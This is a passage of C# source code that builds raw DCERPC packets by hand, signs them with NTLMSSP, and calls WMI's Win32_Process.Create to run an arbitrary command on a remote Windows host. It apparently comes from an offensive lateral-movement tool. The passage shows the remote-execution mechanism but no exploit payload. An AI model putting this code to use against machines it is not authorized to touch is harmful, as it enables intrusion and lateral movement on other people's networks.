                                                0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63,
                                                0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00});
                stubData = stubCombine.Retrieve();

                stage = "Request";
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x07, 0x00, 0x00, 0x00 }))
            {
                sequenceNumber = new Byte[] { 0x08, 0x00, 0x00, 0x00 };
                flags = new Byte[] { 0x83 };
                authPadding = 0;
                callID = new Byte[] { 0x10, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x04, 0x00 };
                opnum = new Byte[] { 0x06, 0x00 };
                requestUUID = ipid2;

                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a,
                                                0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00,
                                                0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63,
                                                0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00});
                stubData = stubCombine.Retrieve();

                stage = "Request";
            }
            else
            {
                sequenceNumber = new Byte[] { 0x09, 0x00, 0x00, 0x00 };
                authPadding = 0;
                callID = new Byte[] { 0x0b, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x04, 0x00 };
                opnum = new Byte[] { 0x18, 0x00 };
                requestUUID = ipid2;

                Byte[] stubLength = BitConverter.GetBytes(command.Length + 1769).Take(2).ToArray();
                Byte[] stubLength2 = BitConverter.GetBytes(command.Length + 1727).Take(2).ToArray();
                Byte[] stubLength3 = BitConverter.GetBytes(command.Length + 1713).Take(2).ToArray();
                Byte[] commandLength = BitConverter.GetBytes(command.Length + 93).Take(2).ToArray();
                Byte[] commandLength2 = BitConverter.GetBytes(command.Length + 16).Take(2).ToArray();
                Byte[] bComand = Encoding.UTF8.GetBytes(command);
                Double paddingCheck = command.Length / 4.0;

                Console.WriteLine("Padding Check " + paddingCheck);
                if ((paddingCheck + 0.25) == Math.Ceiling(paddingCheck))
                {
                    Console.WriteLine(".25");
                    bComand = Misc.Combine(bComand, new Byte[] { 0x00 });
                }
                
                else if ((paddingCheck + 0.50) == Math.Ceiling(paddingCheck))
                {
                    Console.WriteLine(".50");
                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00 });
                }
                else if ((paddingCheck + 0.75) == Math.Ceiling(paddingCheck))
                {
                    Console.WriteLine(".75");
                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00 });
                }
                else
                {
                    Console.WriteLine("Else");
                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
                }

                Combine stubCombine = new Combine();
                stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(causalityId);
                stubCombine.Extend(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a,
                                                0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00,
                                                0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63,
                                                0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72,
                                                0x06, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x63,
                                                0x00, 0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00});
                stubCombine.Extend(stubLength);
                stubCombine.Extend(new Byte[] { 0x00, 0x00 });
                stubCombine.Extend(stubLength);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0x81, 0xa6, 0x12,
                                                0xdc, 0x7f, 0x73, 0xcf, 0x11, 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24,
                                                0x12, 0xf8, 0x90, 0x45, 0x3a, 0x1d, 0xd0, 0x11, 0x89, 0x1f, 0x00, 0xaa, 0x00,
                                                0x4b, 0x2e, 0x24, 0x00, 0x00, 0x00, 0x00 });
                stubCombine.Extend(stubLength2);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 });
                stubCombine.Extend(stubLength3);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x02, 0x53,
                                                0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04,
                                                0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x0b,
                                                0x00, 0x00, 0x00, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00,
                                                0x15, 0x01, 0x00, 0x00, 0x73, 0x01, 0x00, 0x00, 0x76, 0x02, 0x00, 0x00, 0xd4,
                                                0x02, 0x00, 0x00, 0xb1, 0x03, 0x00, 0x00, 0x15, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x12, 0x04, 0x00, 0x80, 0x00, 0x5f,
                                                0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00,
                                                0x61, 0x62, 0x73, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x08, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
                                                0x00, 0x00, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65,
                                                0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00,
                                                0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00,
                                                0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00,
                                                0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00,
                                                0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x94,
                                                0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c,
                                                0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54,
                                                0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
                                                0x6e, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c,
                                                0x69, 0x6e, 0x65, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67,
                                                0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00,
                                                0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00,
                                                0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00,
                                                0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x49,
                                                0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08,
                                                0x00, 0x00, 0x00, 0x59, 0x01, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x0b,
                                                0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00,
                                                0x00, 0x8c, 0x00, 0x00, 0x00, 0x11, 0x01, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00,
                                                0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74,
                                                0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x00, 0x00, 0x73, 0x74,
                                                0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00,
                                                0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0x00, 0x49, 0x6e,
                                                0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00,
                                                0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00,
                                                0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xe2, 0x01, 0x00, 0x00, 0x00,
                                                0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63,
                                                0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61,
                                                0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x43,
                                                0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x7c,
                                                0x6c, 0x70, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65,
                                                0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69,
                                                0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00,
                                                0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00,
                                                0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01,
                                                0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff,
                                                0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00,
                                                0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80,
                                                0x03, 0x08, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00,
                                                0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08,
                                                0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x72, 0x02, 0x00, 0x00, 0x11, 0x03,
                                                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e,
                                                0x67, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6f, 0x63, 0x65,
                                                0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f,
                                                0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65,
                                                0x63, 0x74, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03,
                                                0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x0d,
                                                0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00,
                                                0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00,
                                                0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x57, 0x4d,
                                                0x49, 0x7c, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65,
                                                0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x00, 0x4d, 0x61,
                                                0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00,
                                                0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00,
                                                0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00,
                                                0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44,
                                                0x03, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00,
                                                0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a,
                                                0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xf5, 0x03, 0x00, 0x00, 0x16,
                                                0x03, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00,
                                                0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0xad, 0x03, 0x00,
                                                0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x6f, 0x62,
                                                0x6a, 0x65, 0x63, 0x74, 0x3a, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72,
                                                0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70});
                Byte[] nullBytes = new Byte[501];
                for (Int32 i = 0; i < 501; i++)
                    nullBytes[i] = (Byte)0x00;
                stubCombine.Extend(nullBytes);
                stubCombine.Extend(commandLength);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x0e, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01});
                stubCombine.Extend(commandLength2);
                stubCombine.Extend(new Byte[] { 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45,
                                            0x52, 0x53, 0x00, 0x00});
                stubCombine.Extend(bComand);
                stubCombine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                stubData = stubCombine.Retrieve();

                Console.WriteLine(stubData.Length);
                Console.WriteLine(SPLIT_INDEX);
                if (stubData.Length < SPLIT_INDEX)
                {
                    flags = new Byte[] { 0x83 };
                    stage = "Result";
                }
                else
                {
                    requestSplit = true;
                    Decimal splitStageFinal = Math.Ceiling((Decimal)stubData.Length / SPLIT_INDEX);
                    Console.WriteLine(requestSplitStage);
                    Console.WriteLine(splitStageFinal);
                    if (requestSplitStage < 2)
                    {
                        requestLength = stubData.Length;
                        stubData = stubData.Take(SPLIT_INDEX - 1).ToArray();
                        requestSplitStage = 2;
                        sequenceNumberCounter = 10;
                        flags = new Byte[] { 0x81 };
                        splitIndexTracker = SPLIT_INDEX;
                        stage = "Request";
                    }
                    else if (requestSplitStage == (Int32)splitStageFinal)
                    {
                        requestSplit = false;
                        sequenceNumber = BitConverter.GetBytes(sequenceNumberCounter);
                        requestSplitStage = 0;
                        stubData = stubData.Skip(splitIndexTracker).Take(stubData.Length - splitIndexTracker).ToArray();
                        flags = new Byte[] { 0x82 };
                        stage = "Result";
                    }
                    else
                    {
                        requestLength = stubData.Length - splitIndexTracker;
                        stubData = stubData.Skip(splitIndexTracker).Take(splitIndexTracker + SPLIT_INDEX - 1).ToArray();
                        splitIndexTracker += SPLIT_INDEX;
                        requestSplitStage++;
                        sequenceNumber = BitConverter.GetBytes(sequenceNumberCounter);
                        sequenceNumberCounter++;
                        flags = new Byte[] { 0x80 };
                        stage = "Request";
                    }
                }
                
            }

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetData(requestUUID);
            rpcRequest.SetPacketFlags(flags);
            rpcRequest.SetFragLength(stubData.Length, 16, authPadding);
            rpcRequest.SetCallID(callID);
            rpcRequest.SetContextID(contextID);
            rpcRequest.SetOpnum(opnum);
            
            if (requestSplit)
            {
                Console.WriteLine("Request Length: {0}", requestLength);
                rpcRequest.SetAllocHint(BitConverter.GetBytes(requestLength));
            }
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            NTLMSSPVerifier verifier = new NTLMSSPVerifier();
            verifier.SetAuthPadLen(authPadding);
            verifier.SetAuthLevel(new Byte[] { 0x04 });
            verifier.SetNTLMSSPVerifierSequenceNumber(sequenceNumber);
            Byte[] bVerifier = verifier.GetRequest();

            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = signingKey;
                Combine hmacCombine = new Combine();
                hmacCombine.Extend(sequenceNumber);
                hmacCombine.Extend(bRPCRequest);
                hmacCombine.Extend(stubData);
                hmacCombine.Extend(bVerifier.Take(authPadding + 8).ToArray());
                Byte[] checksum = hmacMD5.ComputeHash(hmacCombine.Retrieve());
                verifier.SetNTLMSSPVerifierChecksum(checksum.Take(8).ToArray());
            }
            bVerifier = verifier.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bRPCRequest);
            combine.Extend(stubData);
            combine.Extend(bVerifier);
            Byte[] bData = combine.Retrieve();

            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();

            if (!requestSplit)
            {
                wmiStream.Read(recieve, 0, recieve.Length);
            }

            while (wmiStream.DataAvailable)
            {
                wmiStream.Read(recieve, 0, recieve.Length);
            }

                Console.WriteLine(stage);
            if ("AlterContext" == stage)
            {
                AlterContext();
            }
            else if ("Request" == stage)
            {
                Request();
            }
            else if ("Result" == stage)
            {
                Result();
            }
            else
            {
                Console.WriteLine("Incorrect Stage");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Result()
        {
            do
            {
                wmiStream.Read(recieve, 0, recieve.Length);
            }
            while (wmiStream.DataAvailable) ;

            UInt16 processId;
            if (9 != recieve[1145])
            {
                processId = BitConverter.ToUInt16(recieve.Skip(1141).Take(2).ToArray(), 0);
                Console.WriteLine("Created Process {0}", processId);
                return;
            }
            Console.WriteLine("Created Process Failed");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClientInitiator && wmiClientInitiator.Connected)
            {
                wmiClientInitiator.Close();
            }

            if (null != wmiClient && wmiClient.Connected)
            {
                wmiClient.Close();
            }

            if (null != randomClient && randomClient.Connected)
            {
                randomClient.Close();
            }
        }
    }
}